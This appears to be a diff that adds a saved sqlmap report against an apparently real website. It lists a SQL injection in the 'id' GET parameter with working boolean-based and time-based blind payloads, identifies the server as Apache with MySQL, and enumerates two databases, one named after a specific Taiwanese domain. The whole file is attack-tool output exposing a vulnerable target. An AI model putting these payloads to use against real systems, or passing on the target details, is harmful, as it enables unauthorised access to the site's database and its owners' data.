@@ -1,0 +1,17 @@
+sqlmap identified the following injection point(s) with a total of 333 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=10 AND 9105=9105
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=10 AND SLEEP(5)
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] cellbio_web_maker_com_tw
+[*] information_schema
+
